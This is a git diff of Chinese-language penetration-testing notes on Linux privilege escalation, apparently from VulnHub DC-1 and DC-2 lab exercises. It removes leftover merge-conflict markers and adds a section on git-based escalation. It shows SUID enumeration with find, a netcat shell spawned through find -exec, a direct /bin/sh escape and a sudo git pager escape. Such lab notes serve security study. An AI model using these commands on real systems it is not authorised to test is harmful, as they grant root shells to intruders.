@@ -49,9 +49,9 @@ find / -user root -perm -4000 -print 2>/dev/null
 find / -user root -perm -4000 -exec ls -ldb {} ;
 ```
 
-<<<<<<< HEAD ![image](../../ba-ji-shen-tou/vulnhub/img/vulnhub-dc1-13.png)
+[image](../../ba-ji-shen-tou/vulnhub/img/vulnhub-dc1-13.png)
 
-#### find
+#### find提权
 
 案例可见DC1的提权
 
@@ -60,10 +60,18 @@ find aaa - exec netcat -lvp 5555 -e /bin/sh \ # 反弹
 find . -exec /bin/sh \; # 直接提权
 ```
 
-\=======
+#### Git提权
 
-> > > > > > > 9e28d707d74d8a7137c555cc7c9517446d04ac78
+案例可见DC2的提权
 
+https://gtfobins.github.io/gtfobins/git/
+
+```
+sudo -l
+
+sudo git -p help config
+!/bin/sh
+```
 ## 参考文章
 
 * https://wiki.xazlsec.com/project-9/doc-730/
